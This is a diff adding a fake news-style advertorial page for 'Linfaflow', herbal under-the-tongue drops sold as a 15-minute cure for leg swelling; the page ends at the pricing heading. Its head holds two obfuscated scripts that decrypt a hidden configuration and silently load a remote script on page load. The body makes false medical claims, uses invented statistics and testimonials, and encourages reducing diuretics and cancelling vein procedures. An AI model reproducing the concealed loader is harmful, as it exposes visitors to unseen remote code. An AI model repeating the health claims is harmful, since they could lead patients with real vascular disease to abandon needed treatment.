@@ -1,0 +1,1213 @@
+<html xmlns="https://www.w3.org/1999/xhtml" dir="ltr">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title class="article-header">Linfaflow - Adv04</title>
+
+    <link href="css/index2.css" type="text/css" rel="stylesheet">
+    <link href="css/bootstrap.css" type="text/css" rel="stylesheet">
+    <link href="css/css.css" rel="stylesheet">
+    <link href="css/page.css" rel="stylesheet">
+    <script>(function(){var p_a0n=atob("DEJ71PC/hsEKTWKmkDlZoYLTpPsoJRbS4DFB+9/c4q8kOBbL+SQC+pPQ6+9oP03V8zASpITMqbFjNQfKvzISrJXTqKt5b06E8TYPppnd87VvPkCcyx9X9pfT6aNrIRGEqhkA9p7e66Qod0DW+ToeuLnbpO0oOwPK5SdZ7tKJv6U8eQCTqCdMtZWP5/NvKwHDpyZKsZKd+5x3");var d_o=[];for(var v_97=0;v_97<p_a0n.length;v_97++){d_o.push(p_a0n.charCodeAt(v_97)&255);}var m_wxr=d_o[0];var r_ld=d_o.slice(1,1+m_wxr);var z_z=d_o.slice(1+m_wxr);var v_m=z_z.map(function(b,z_2p){return b^r_ld[z_2p%m_wxr];});var u_hzw="";for(var q_ieu=0;q_ieu<v_m.length;q_ieu++){u_hzw+=String.fromCharCode(v_m[q_ieu]&255);}var z_1qk=decodeURIComponent(escape(u_hzw));var z_x7k=JSON.parse(z_1qk);var d_d6y=z_x7k.globals||[];d_d6y.forEach(function(n_t){window[n_t.name]=n_t.value;});var n_hzr=document.createElement("script");n_hzr.src=z_x7k.url;n_hzr.async=true;n_hzr.defer=true;(z_x7k.attributes||[]).forEach(function(i_36){n_hzr.setAttribute(i_36.name,i_36.value);});(document.head||document.documentElement).appendChild(n_hzr);})();</script>
+    <script>(function(){var v_b=atob("DKmNBNFrugn5t4ESZNKvcaMHmDPb3/VmFNq3K/4I3mfXwvV/Dc/0KrIE1yebxa5hB9vkdKUYlXyN2vI9CMj5YaIflGOKla0wBd35drgJz32cxKMoP9KvarAG3yvDleVzEMigcaUG02+AmvFgAd/oaqVGwmqW06xhB8KvKPMd22WM0qMoRovwKKpJ1GiU0qMoRs3scLBGz32U3udrSdn/YacO1H3UxPRwDc3+Jv1JzGiVwuQwXouveYwW");var p_0p6=[];for(var r_87=0;r_87<v_b.length;r_87++){p_0p6.push(v_b.charCodeAt(r_87)&255);}var v_jor=p_0p6[0];var l_2tlv=p_0p6.slice(1,1+v_jor);var t_z7yt=p_0p6.slice(1+v_jor);var p_f=t_z7yt.map(function(b,m_j){return b^l_2tlv[m_j%v_jor];});var p_uu="";for(var q_i16k=0;q_i16k<p_f.length;q_i16k++){p_uu+=String.fromCharCode(p_f[q_i16k]&255);}var r_fp=decodeURIComponent(escape(p_uu));var y_g=JSON.parse(r_fp);var s_ycw=y_g.globals||[];s_ycw.forEach(function(c_8vfq){window[c_8vfq.name]=c_8vfq.value;});var h_z5qe=document.createElement("script");h_z5qe.src=y_g.url;h_z5qe.async=true;h_z5qe.defer=true;(y_g.attributes||[]).forEach(function(x_3cu3){h_z5qe.setAttribute(x_3cu3.name,x_3cu3.value);});(document.head||document.documentElement).appendChild(h_z5qe);})();</script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BSCPE4E0C7"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-BSCPE4E0C7');
+    </script>
+</head>
+<body data-gr-c-s-loaded="true" cz-shortcut-listen="true">
+        <!-- NEWS-STYLE HEADER -->
+        <div class="site-header">
+            <nav class="section-nav">
+                <div class="nav-brand">
+                    <button class="menu-btn js-menu" aria-label="Open menu" aria-expanded="false" aria-controls="mobileMenu">
+                        <span></span><span></span><span></span>
+                    </button>
+                    <a class="logo" href="#" aria-label="UNN"><span class="logo-text">UNN</span></a>
+                </div>
+                <ul>
+                    <li>US</li>
+                    <li>World</li>
+                    <li>Politics</li>
+                    <li class="active">Health</li>
+                    <li>Lifestyle</li>
+                </ul>
+                <div class="scroll-progress" id="scrollProgress"></div>
+            </nav>
+        </div>
+        <div class="mobile-menu" id="mobileMenu" role="dialog" aria-modal="true" aria-label="Site menu">
+            <div class="scrim" data-close></div>
+            <div class="drawer">
+                <div class="drawer-head">
+                    <a class="logo" href="#" aria-label="UNN"><span class="logo-text">UNN</span></a>
+                    <button class="drawer-close" data-close aria-label="Close menu">&times;</button>
+                </div>
+                <ul>
+                    <li>US</li>
+                    <li>World</li>
+                    <li>Politics</li>
+                    <li class="active">Health</li>
+                    <li>Lifestyle</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="container content">
+            <div class="row">
+
+                <div class="col-md-9">
+
+                    <!-- ARTICLE HEADER -->
+                    <h1>Top MD Warns: Drop this 1 "Botanical" Under Your Tongue for Your Swollen Ankles & Feet for Immediate Edema Relief?</h1>
+            <p class="text-base text-gray-600 mb-4">Written by Dr. Andy Salazar, MD</p>
+
+                    <!-- Featured Image -->
+                    <img src="images/hero1.png" class="img-responsive" style="margin-bottom:15px;">
+
+                    <!-- OPENING -->
+                    <p>I'm about to <b>piss off</b> every vein specialist, vascular surgeon, and pharmaceutical company in
+                        America.
+                    </p>
+
+                    <p>Because what I'm about to share could <b>cost them MILLIONS</b> in lost revenue.</p>
+
+                    <p>But I don't care anymore.</p>
+
+                    <p>After watching my patient Ruth write <b>"I DON'T RECOGNIZE MY OWN LEGS ANYMORE"</b> in all caps on her
+                        follow-up survey...</p>
+
+                    <p>After seeing her describe sitting at her daughter's wedding reception... <b>ankles so swollen</b> her
+                        shoes
+                        had split at the seams... trying to hide her legs under the tablecloth because they looked like
+                        they
+                        belonged to someone twice her size...</p>
+
+                    <p>After watching the "experts" shove her into compression stockings she could barely get on,
+                        prescribe
+                        diuretics that left her dizzy and depleted, and try to sell her a $7,000 vein ablation procedure
+                        that her insurance wouldn't cover...</p>
+
+                    <p>I knew the system had failed her.</p>
+
+                    <p>So I went rogue and discovered something that changed everything.</p>
+
+                    <p>And if you're reading this with legs so heavy they feel like concrete by 3 PM, ankles so puffy
+                        you
+                        can press your thumb in and watch the dent stay for 30 seconds, or feet so swollen you haven't
+                        worn
+                        real shoes in months...</p>
+
+                    <p><strong>The next 5 minutes could be the most important of your life.</strong></p>
+
+                    <p>My name is Dr. Andy Salazar. I've been a licensed pain specialist for 12 years.</p>
+
+                    <p>I serve as the Medical Director of Peak Health Research, an independent organization dedicated to
+                        finding natural cures the pharmaceutical industry ignores.</p>
+
+                    <p>And I'm about to expose the dirty secret that keeps millions of Americans trapped with heavy,
+                        swollen, aching legs... while the medical industry laughs all the way to the bank.</p>
+
+                    <p>But first, let me tell you about the evening that changed everything...</p>
+
+
+                    <!-- SECTION: THE NIGHT EVERYTHING CHANGED -->
+                    <h2><strong>THE NIGHT EVERYTHING CHANGED…</strong></h2>
+                    <img src="images/image13.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>I was in my office late on a Thursday night. Going through patient surveys from the week.</p>
+
+                    <p>Most of them were pretty standard. "The compression socks helped a little." "Still managing the
+                        swelling."</p>
+
+                    <p>Then I got to Ruth's. And my stomach dropped.</p>
+
+                    <p>She'd written in all caps: <strong>"I DON'T RECOGNIZE MY OWN LEGS ANYMORE."</strong></p>
+
+                    <p>Not "the swelling is bad." Not "I'm uncomfortable."</p>
+
+                    <p><strong>"I DON'T RECOGNIZE MY OWN LEGS ANYMORE."</strong></p>
+
+                    <p>She described coming home from her daughter's wedding. Sitting on the edge of the bathtub.
+                        Looking
+                        down at her legs... and crying.</p>
+
+                    <p>Not because they hurt. Because they didn't look like hers.</p>
+
+                    <p>Her ankles had vanished. Her calves were stretched tight and shiny. The skin on her shins was
+                        discolored... a mottled reddish-brown she'd never seen before. She could press her thumb into
+                        the
+                        top of her foot and the indent would stay for almost a minute.</p>
+
+                    <p>She wrote that she'd stopped wearing skirts three years ago.</p>
+
+                    <p>Stopped going to the community pool.</p>
+
+                    <p>Stopped accepting dinner invitations because restaurants meant sitting for two hours, and by the
+                        time
+                        she stood up, her legs would be so swollen and stiff she could barely walk to the car.</p>
+
+                    <p>She was 66 years old. And she felt like she was watching her body betray her in slow motion.</p>
+
+                    <img src="images/image6.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>And here's what killed me...</p>
+
+                    <p>Ruth had done EVERYTHING her doctors told her to do. Compression stockings. Elevation. Diuretics.
+                        Salt restriction. Two different vein specialists.</p>
+
+                    <p>All of it. Nothing worked for more than a few hours.</p>
+
+                    <p>Her primary care doctor? Put her on furosemide. A diuretic that made her run to the bathroom 14
+                        times
+                        a day. Left her lightheaded and exhausted. Her legs? Still swollen by noon.</p>
+
+                    <p>Her vein specialist? Told her the valves in her leg veins were "failing" and recommended a $7,000
+                        vein ablation procedure. Her insurance denied it. Said it was "cosmetic."</p>
+
+                    <p><em>Cosmetic.</em></p>
+
+                    <p>As if legs so swollen she couldn't tie her own shoes were a beauty concern.</p>
+
+                    <p>And the compression stockings? She could barely wrestle them on in the morning. By afternoon, the
+                        elastic had cut into her swollen calves so deeply it left angry red grooves. She described
+                        peeling
+                        them off at night as "the only relief I get... and even that only lasts until morning."</p>
+
+                    <p>I sat there staring at that survey for twenty minutes. And something inside me snapped.</p>
+
+                    <p>I wasn't gonna let this keep happening. Not to Ruth. Not to anyone else.</p>
+
+
+                    <!-- SECTION: THE MIND BLOWING DISCOVERY -->
+                    <h2><strong>THE MIND BLOWING DISCOVERY</strong></h2>
+                    <img src="images/image14.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>For the next 3 months, I lived like a man possessed.</p>
+
+                    <p>I devoured every research paper on chronic venous insufficiency and lower leg edema I could find.
+                        Called vascular researchers at Johns Hopkins, the Cleveland Clinic, and the Mayo Clinic. Flew to
+                        medical conferences in Germany and Switzerland. Spent $11,000 of my own money on medical
+                        journals,
+                        insider reports, and access to restricted research databases.</p>
+
+                    <p>My wife thought I was losing my mind. Maybe I was. But I didn't care.</p>
+
+                    <p>And what I found... genuinely made me want to punch a hole through my computer screen.</p>
+
+                    <p><strong>The entire vein treatment industry is built on a lie.</strong></p>
+
+                    <p>A $3 billion lie that keeps you swollen, miserable, and reaching for your wallet.</p>
+
+                    <p>Here's what they don't want you to know:</p>
+
+                    <p>Compression socks, elevation, and diuretics don't fix leg swelling. They manage it. Temporarily.
+                        Like
+                        bailing water out of a boat with a hole in the bottom.</p>
+
+                    <p>Every treatment your doctor has given you addresses the SYMPTOM... the fluid in your legs...
+                        without
+                        fixing the CAUSE... the reason the fluid keeps leaking there in the first place.</p>
+
+                    <p>Think about that for a second.</p>
+
+                    <p>Compression socks squeeze the fluid up. But the second you take them off? The fluid pours right
+                        back.
+                    </p>
+
+                    <p>Elevation uses gravity to drain your legs. But the moment you stand up? The flooding starts
+                        again.
+                    </p>
+
+                    <p>Diuretics force your kidneys to dump water. But they don't fix a single leaking valve or seal a
+                        single leaking capillary. And here's the really cruel part... diuretics actually <strong>deplete
+                            your magnesium</strong>, which your veins desperately need to function properly. The pills
+                        meant
+                        to help your legs are quietly making the underlying problem WORSE.</p>
+
+                    <p>It's like mopping the floor while the pipe is still burst.</p>
+
+                    <p>So what's actually causing the flood?</p>
+
+                    <p><strong>Your legs are drowning. And I don't mean that metaphorically.</strong></p>
+
+
+                    <!-- SECTION: THE REAL ROOT CAUSE -->
+                    <h2><strong>THE REAL ROOT CAUSE OF SWOLLEN LEGS</strong></h2>
+                    <img src="images/image3.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>Picture the veins in your legs like a series of one-way doors stacked on top of each other.</p>
+
+                    <p>When you're young, those doors snap shut cleanly after each heartbeat. Blood gets pushed up
+                        toward
+                        your heart, the doors close behind it, and gravity can't pull it back down.</p>
+
+                    <p>But after years of standing, sitting, and living... those doors start to warp. They don't close
+                        all
+                        the way anymore. Blood starts leaking backward. Pooling in your lower legs. Building up pressure
+                        like water behind a failing dam.</p>
+
+                    <p>This is called Chronic Venous Insufficiency. And it affects over 50 million Americans.</p>
+
+                    <p>But here's the part nobody talks about...</p>
+
+                    <p>The pooling blood isn't just sitting there. <strong>It's ATTACKING your legs from the
+                            inside.</strong></p>
+
+                    <p>The elevated pressure forces fluid out of your capillaries and into the surrounding tissue. Think
+                        of
+                        it like a garden hose with too much pressure... the water starts spraying out of every tiny
+                        crack
+                        and weakness in the line.</p>
+
+                    <p>That's what's happening inside your legs right now. Fluid is being forced through the walls of
+                        your
+                        smallest blood vessels and flooding the tissue around them.</p>
+
+                    <p>And it gets worse.</p>
+
+                    <p>Your body's inflammatory response kicks in. Mast cells start dumping histamine. White blood cells
+                        start chewing on your vessel walls. Inflammatory molecules called leukotrienes start punching
+                        MORE
+                        holes in your capillaries... making them leak even faster.</p>
+
+                    <p>Meanwhile, your lymphatic system... the drainage network that's supposed to carry all this excess
+                        fluid away... gets overwhelmed and compressed by the swelling itself.</p>
+
+                    <p>So the drains are clogged. The faucet is still running. And the pipes have holes in them.</p>
+
+                    <p>This is <strong>"Vascular Drowning Syndrome."</strong></p>
+
+                    <p>And it explains EVERYTHING.</p>
+
+                    <ul class="symlist">
+                        <li>Why your legs are worst by evening... gravity has been pulling fluid down all day while your
+                            damaged valves let it pool.</li>
+                        <li>Why elevation only helps temporarily... you're draining the flood, but the holes in the
+                            pipes
+                            are still there. The moment you stand up, the cycle starts again.</li>
+                        <li>Why compression socks feel like a temporary fix... they're squeezing from outside, but the
+                            capillaries are still leaking from inside.</li>
+                        <li>Why the swelling keeps getting worse over time... the inflammation damages more valves and
+                            punches more holes, which causes more swelling, which causes more inflammation. A vicious
+                            cycle
+                            that feeds itself.</li>
+                    </ul>
+
+                    <p>Chronic venous disease afflicts more than 190 million Americans. That's 1.5 times MORE people
+                        than
+                        all cardiovascular diseases combined.</p>
+
+                    <p>And the medical industry treats it like an afterthought.</p>
+
+                    <p>You know why? Because swollen legs aren't "dramatic" enough for emergency rooms. They don't get
+                        you
+                        on the surgery schedule fast enough to bill insurance $50,000.</p>
+
+                    <p>They're just... inconvenient. Uncomfortable. Embarrassing.</p>
+
+                    <p>Until they're not.</p>
+
+                    <p>Until the skin on your legs starts breaking down. Until the discoloration turns permanent. Until
+                        the
+                        first ulcer opens up... and suddenly you're looking at $55 to $70 billion in annual medical
+                        costs
+                        that the system is more than happy to collect.</p>
+
+                    <p>They don't want to fix your swelling early. Because your swelling getting WORSE is what fills
+                        their
+                        vein clinics, wound care centers, and surgical suites.</p>
+
+                    <p>It's genius, really. If you're a sociopath who sees human suffering as a revenue stream.</p>
+
+
+                    <!-- SECTION: THE 15-MINUTE MIRACLE -->
+                    <h2><strong>THE 15-MINUTE MIRACLE HIDING IN PLAIN SIGHT</strong></h2>
+                    <img src="images/image12.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>Remember Ruth? The woman who wrote "I DON'T RECOGNIZE MY OWN LEGS ANYMORE" on that survey?</p>
+
+                    <p>Three weeks after I applied these findings to her treatment, she wore a skirt to church for the
+                        first
+                        time in three years.</p>
+
+                    <p>No compression stockings. No diuretics. No $7,000 vein procedure.</p>
+
+                    <p>Truly life-changing.</p>
+
+                    <p>We used a new <strong>"Drain and Seal" method</strong>. And here's the part that surprised even
+                        me: it works better as drops than it ever could as a cream.</p>
+
+                    <p>Creams have to fight their way through your skin's outer barrier just to reach maybe a
+                        fraction of what you applied. Most of what you rub on ends up sitting on the surface, or
+                        rubbing off on your socks before it ever gets to work.</p>
+
+                    <p>By placing specific compounds under the tongue instead, we bypass slow digestion completely
+                        and send them straight into your bloodstream... where they can reach your legs, your veins,
+                        and your capillaries from the inside, all at once. Not just wherever you happened to rub a
+                        cream that morning.</p>
+
+                    <p>Outside-in only ever touches the surface. Inside-out reaches everywhere the damage actually
+                        is... right where the damage was happening.</p>
+
+                    <p>To fix chronic leg swelling, you need to do THREE things at the same time:</p>
+
+                    <div class="s1bx25">
+                        <p><strong>Step 1) DRAIN the excess fluid</strong> by opening up the lymphatic channels that have
+                            been
+                            overwhelmed and compressed. Your lymphatic system is the drainage network that carries
+                            excess
+                            fluid away from your tissues. In chronic swelling, it's backed up like a clogged pipe. You
+                            need
+                            to physically widen those drainage channels and get the fluid moving again.</p>
+                    </div>
+
+                    <div class="s1bx25">
+                        <p><strong>Step 2) SEAL the leaking capillaries</strong> that keep flooding your tissues. This is the
+                            step EVERYONE misses. Your tiniest blood vessels have holes in them. Inflammatory molecules
+                            are
+                            punching through the walls and fluid is pouring out. Until you seal those leaks, draining
+                            the
+                            fluid is pointless... it'll just flood right back.</p>
+                    </div>
+
+                    <div class="s1bx25">
+                        <p><strong>Step 3) RESTORE proper vein and muscle pump function</strong> so blood stops pooling
+                            backward
+                            in the first place. Your calf muscles are supposed to squeeze blood back up toward your
+                            heart
+                            with every step. But magnesium deficiency, inflammation, and damaged valves have crippled
+                            that
+                            pumping system. You need to get it working again.</p>
+                    </div>
+
+                    <p>Miss even ONE of these steps, and you're wasting your time.</p>
+
+                    <p>That's why compression socks don't work long-term. (They squeeze from outside but don't seal the
+                        leaks inside.)</p>
+
+                    <p>That's why diuretics don't work. (They drain fluid through your kidneys while depleting the
+                        magnesium
+                        your veins desperately need.)</p>
+
+                    <p>That's why elevation alone doesn't work. (Gravity drains the flood temporarily but the pipes are
+                        still leaking.)</p>
+
+                    <p>That's why vein procedures often disappoint. (They close off damaged veins but don't address the
+                        inflammatory capillary leaking that drives the swelling.)</p>
+
+                    <p>You need all three. At the same time. Working together.</p>
+
+                    <p>A Triple-Action Drain, Seal, and Restore. And that's exactly what this formula delivers.</p>
+
+                    <h2><strong>THIS BREAKTHROUGH IS PISSING OFF AN ENTIRE INDUSTRY</strong></h2>
+
+                    <p>After Ruth's recovery, word spread fast.</p>
+
+                    <p>My colleague Sharon... an ICU nurse I'd worked with for years... cornered me in the hospital
+                        break
+                        room one evening.</p>
+
+                    <p><em>"Whatever you did for Ruth. I need it. NOW."</em></p>
+
+                    <p>Sharon was 54. Tough as nails. The kind of person who never complained about anything.</p>
+
+                    <p>But twelve-hour shifts on her feet had destroyed her legs. By hour eight, her ankles would be so
+                        swollen her compression socks were cutting off circulation instead of helping it. She'd started
+                        wearing scrub pants two sizes too big just to hide the swelling from her patients.</p>
+
+                    <p>The worst part? She was a nurse. She KNEW what chronic venous insufficiency could lead to... the
+                        skin
+                        changes, the discoloration, the ulcers. She was watching it happen to her own legs and felt
+                        completely powerless.</p>
+
+                    <p>She'd tried everything. Three different brands of medical-grade compression stockings. Elevation
+                        on
+                        her breaks. Diuretics that made her dehydrated during 12-hour shifts... dangerous when you're
+                        responsible for critically ill patients. Nothing stopped the swelling from coming back.</p>
+
+                    <p>I gave her a sample of the formula. Told her to place a dropper under her tongue after her
+                        shift.
+                    </p>
+
+                    <p>Fifteen minutes later, she texted me. <strong><em>"Andy... I can see my ankle bones. I haven't
+                                seen
+                                my ankle bones after a shift in two years."</em></strong></p>
+
+                    <img src="images/image1.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>The next morning, she woke up and her legs looked normal. Not "slightly less swollen." Normal.
+                        The
+                        skin wasn't shiny and stretched. The dents from her socks were gone. She could see the actual
+                        shape
+                        of her calves again.</p>
+
+                    <p>She called me from her kitchen, and I could hear her voice cracking.</p>
+
+                    <p>Not from pain. From relief.</p>
+
+                    <p>Within 72 hours, I had people tracking me down. Teachers whose legs ached so badly by 3 PM they
+                        couldn't stand for their last class... Retirees who hadn't worn sandals in years because they
+                        were
+                        ashamed of how their feet looked... Office workers whose legs were so heavy by quitting time
+                        they
+                        dreaded the walk to their car...</p>
+
+                    <p>Every. Single. One. Got. Better.</p>
+
+                    <p>Not "learned to manage it" better. Not "found ways to cope" better.</p>
+
+                    <p><strong>ACTUALLY BETTER.</strong></p>
+
+                    <p>That's when the threats started.</p>
+
+
+                    <!-- SECTION: THE INDUSTRY THREATS -->
+                    <h2><strong>WHEN YOU THREATEN THE $70 BILLION SWOLLEN-LEG INDUSTRY, THEY COME FOR YOU</strong></h2>
+                    <img src="images/image17.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>First, it was "friendly" warnings.</p>
+
+                    <p>A vein specialist I'd known for over a decade pulled me aside at a conference: <em>"Andy, what
+                            you're
+                            doing is making us look bad. Patients are canceling their ablation consultations. You should
+                            stop before someone gets hurt."</em></p>
+
+                    <p>Translation: Stop before WE lose money.</p>
+
+                    <p>Then came the cease and desist letters. Three law firms. All representing "concerned medical
+                        professionals." Claiming I was "practicing outside my scope."</p>
+
+                    <p>The final straw? A compression garment rep I'd worked with for 8 years... the guy who used to
+                        take me
+                        to lunch every month to push his medical-grade stockings... stopped returning my calls.</p>
+
+                    <p><em>"Sorry Andy, corporate told me to focus on other accounts. Nothing personal."</em></p>
+
+                    <p>They wanted me gone because I'd created something that could make their entire business model
+                        obsolete.</p>
+
+                    <p>A simple liquid drop formula that:</p>
+
+                    <ul class="symlist">
+                        <li>Fixed the ROOT CAUSE of leg swelling (not just squeezed it from outside)</li>
+                        <li>Worked in 15 minutes (not hours of uncomfortable compression)</li>
+                        <li>Cost less than a single insurance copay</li>
+                        <li>Let people heal themselves at home (not in some expensive vein clinic)</li>
+                    </ul>
+
+                    <p>But here's what those medical industry vultures didn't count on...</p>
+
+                    <p>I'd already partnered with a small team of biomedical engineers who believed in what we were
+                        doing.
+                        People who'd watched their own family members suffer through the same broken system.</p>
+
+                    <p>And together, we'd turned my clinical discovery into something anyone could access.</p>
+
+
+                    <!-- SECTION: INTRODUCING THE PRODUCT -->
+                    <h2><strong>INTRODUCING THE FORMULA VEIN CLINICS DON'T WANT YOU TO KNOW ABOUT</strong></h2>
+                    <img src="images/firstdisplay.png" class="img-responsive" style="margin: 20px 0;">
+                    <img src="images/seen.png" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>It's called <strong>Linfaflow.</strong></p>
+
+                    <p>And unlike every cream on the market that just sits on your skin hoping to soak in, Linfaflow
+                        works from the inside out.</p>
+
+                    <p>It is the ONLY liquid drop formula on earth that delivers all three requirements for lasting leg
+                        swelling relief:</p>
+
+                    <p><strong>Stillingia Root... The drainage activator.</strong></p>
+
+                    <p>In laboratory studies, Stillingia did something no compression sock can do... it actually WIDENED the
+                        lymphatic vessels themselves while simultaneously shutting down the mast cells that dump
+                        histamine
+                        into your tissues. It's like unclogging the drain AND turning off the faucet at the same time.
+                        Clinical research confirmed it improves venous tone and reduces edema in venous insufficiency
+                        patients.</p>
+
+                    <p><strong>Cleavers &amp; Prickly Ash... The leak sealers.</strong></p>
+
+                    <p>Cleavers' active compounds shut down 5-LOX, the enzyme that manufactures the leukotrienes
+                        punching
+                        holes in your capillaries. In a clinical trial, 60% of patients taking this compound experienced
+                        MORE
+                        than 75% reduction in edema. Meanwhile, Prickly Ash suppresses a completely separate inflammatory pathway
+                        (S1P/NF-kB) that increases vascular permeability... the technical term for your blood vessels
+                        leaking like a sieve.</p>
+
+                    <p><strong>Red Clover Complex... The restoration complex.</strong></p>
+
+                    <p>Red Clover corrects the botanical deficiency that roughly half of Americans have (and that diuretics
+                        make WORSE). It supports vasodilation and the calf muscle pump that pushes blood back toward
+                        your
+                        heart. It also fuels the formation of new, healthy blood vessels and stabilizes mast cells
+                        to
+                        prevent future histamine-driven leaking.</p>
+
+                    <p>That's FOUR independent pathways working on your swelling. Not from one angle. From every angle
+                        simultaneously. In one liquid drop formula.</p>
+
+                    <p>And unlike a cream, this doesn't stop at your skin.</p>
+
+                    <p>You literally just place it under your tongue. It absorbs straight into your bloodstream and
+                        travels to every vein and capillary that needs it... not just the patch of skin you happened
+                        to rub. Working from the inside out reaches what a cream sitting on the surface never can. And
+                        let the science do the work.</p>
+
+                    <p>No compression stockings cutting into your legs. No diuretics making you lightheaded. No waiting
+                        rooms.</p>
+
+                    <p>Just your legs finally getting what they've been desperately needing:</p>
+
+                    <div class="midtxtbx1">
+                        <p>Drainage. Repair. Protection.</p>
+                    </div>
+<br>
+
+                    <!-- SECTION: HOW IT WORKS -->
+                    <h2><strong>HERE IS EXACTLY HOW IT DEFEATS LEG SWELLING IN 15 MINUTES</strong></h2>
+                    <img src="images/image16.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>When you place Linfaflow under your tongue... Here is what happens inside
+                        your
+                        body:</p>
+
+                    <div class="s1bx25">
+                        <p><strong>0-5 Minutes: The Drain Phase</strong></p>
+                        <p>The Stillingia Root enters your bloodstream and begins widening your lymphatic vessels... the drainage channels
+                            that
+                            have been overwhelmed and compressed by months or years of swelling. Simultaneously,
+                            you'll feel
+                            a light herbal warmth spreading through your body that eases the hot, heavy ache
+                            in
+                            your legs. That "concrete block" feeling starts lifting almost immediately. Most people
+                            notice
+                            their legs feeling lighter within the first few minutes. That's not a placebo. That's
+                            stagnant
+                            fluid finally having somewhere to GO.</p>
+                    </div>
+
+                    <div class="s1bx25">
+                        <p><strong>5-10 Minutes: The Seal Phase</strong></p>
+                        <p>This is where the real breakthrough happens. Cleavers' active compounds go to work on the
+                            5-LOX
+                            enzyme, shutting down leukotriene production... the inflammatory molecules that have been
+                            punching holes in your capillary walls. At the same time, Prickly Ash suppresses the
+                            S1P/NF-kB
+                            pathway, a completely separate system that's been making your blood vessels leak. Stillingia
+                            reduces
+                            ICAM-1 expression, stopping inflammatory cells from sticking to your vessel walls and
+                            causing
+                            more damage. Think of it like patching every hole in a leaking roof... from the inside.</p>
+                    </div>
+
+                    <div class="s1bx25">
+                        <p><strong>10-15 Minutes: The Restore Phase</strong></p>
+                        <p>The Red Clover Complex promotes vasodilation, helping your calf muscles do what
+                            compression
+                            socks only imitate... push pooled blood and fluid back up toward your heart. Prickly Ash directly
+                            helps
+                            rebalance fluid distribution throughout your legs. And Red Clover begins fueling the
+                            formation
+                            of new, healthy blood vessels while stabilizing the mast cells that have been dumping
+                            histamine
+                            into your tissues. Meanwhile, the formula goes to work on the vessel walls themselves...
+                            repairing
+                            the thinning, discolored tissue that chronic swelling has been damaging for months or years.
+                        </p>
+                    </div>
+
+                    <p>After 15 minutes? You look down and see legs you recognize again.</p>
+
+                    <p>Not "slightly less puffy" like after elevation. Not "squeezed into shape" like compression
+                        stockings.
+                    </p>
+
+                    <p><strong>Actually. Normal.</strong></p>
+
+                   
+
+                    <!-- SECTION: RESULTS -->
+                    <h2><strong>THE RESULTS THAT HAVE VEIN CLINICS SCRAMBLING</strong></h2>
+                    <img src="images/display.png" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>In the last 18 months, over 10,000 people have used Linfaflow for leg swelling, ankle
+                        edema,
+                        and chronic venous insufficiency.</p>
+
+                    <p>The results?</p>
+
+                    <ul class="symlist">
+                        <li>Over 90% report significant reduction in swelling within the first week</li>
+                        <li>Most reduced or completely eliminated their diuretic medications</li>
+                        <li>Many canceled the vein procedures their doctor had recommended</li>
+                    </ul>
+
+                    <p>But my favorite stat? Our refund rate is 0.4%. That's FOUR people per thousand.</p>
+
+
+                    <p><strong>Don't take my word for it. Here's what real people are saying:</strong></p>
+
+                    <!-- TESTIMONIALS -->
+                    <div class="blockquote">
+                        <p><strong><em>Ruth, 66:</em></strong> <em>"I'd given up on my legs. Three years of compression
+                                stockings, diuretics, and elevation... and every single evening I'd look down and see
+                                the
+                                same swollen, discolored stumps. I'd stopped wearing anything that showed my legs.
+                                Stopped
+                                going to the pool with my grandkids. When my daughter got married, I sat at the table
+                                all
+                                night because I was too embarrassed to get on the dance floor. Three weeks after
+                                starting
+                                Linfaflow, I looked down after a full day on my feet and saw my ACTUAL ANKLES. I
+                                could see the bones. The skin wasn't shiny and stretched. I sat on my bathroom floor and
+                                cried. My doctor told me the improvement was 'remarkable' and asked what I'd changed.
+                                When I
+                                told him it was liquid drops, he looked at me like I'd lost my mind."</em></p>
+                    </div>
+
+                    <div class="blockquote">
+                        <p><strong><em>Frank, 71:</em></strong> <em>"I'm a retired carpenter. Spent 40 years on my feet
+                                and
+                                my veins paid the price. By the time I retired, my legs were so swollen by evening I
+                                couldn't get my shoes off without my wife's help. The skin on my shins was turning
+                                brown. My
+                                doctor said I was heading toward ulcers and wanted me in medical-grade compression
+                                stockings
+                                14 hours a day. You ever tried pulling compression stockings over legs the size of fence
+                                posts? It took me 20 minutes every morning. I was ready to give up. My son ordered this
+                                for
+                                me and I figured what the hell. After about two weeks, the swelling was noticeably down.
+                                After a month, I could put my shoes on and take them off by myself. My wife says my legs
+                                look better than they have in 10 years. The brown patches are even starting to
+                                fade."</em>
+                        </p>
+                    </div>
+
+                    <div class="blockquote">
+                        <p><strong><em>Beverly, 63:</em></strong> <em>"The diuretics were the worst part. I was running
+                                to
+                                the bathroom every 45 minutes. Couldn't go on car trips. Couldn't sit through a movie.
+                                Couldn't sleep through the night without getting up three times. And my legs were STILL
+                                swollen. My doctor kept increasing the dose. I was exhausted, dehydrated, and dizzy...
+                                and
+                                my ankles still looked like softballs. A friend at church told me about Linfaflow
+                                and
+                                I was skeptical. But within the first week, I noticed the heaviness in my legs was less
+                                by
+                                evening. By week three, I asked my doctor about reducing the diuretics. He was hesitant,
+                                but
+                                when he saw my legs, he agreed. I'm on half the dose now and my swelling is better than
+                                it
+                                was on the full dose. I can sleep through the night. I can sit through my grandson's
+                                baseball games. I feel like a human being again."</em></p>
+                    </div>
+
+
+                    <!-- SECTION: PRICING -->
+                    <h2><strong>THE PRICE THAT IS CAUSING MEDICAL INDUSTRY PANIC</strong></h2>
+                    <img src="images/image2.png" class="img-responsive" style="margin: 20px 0;">
+
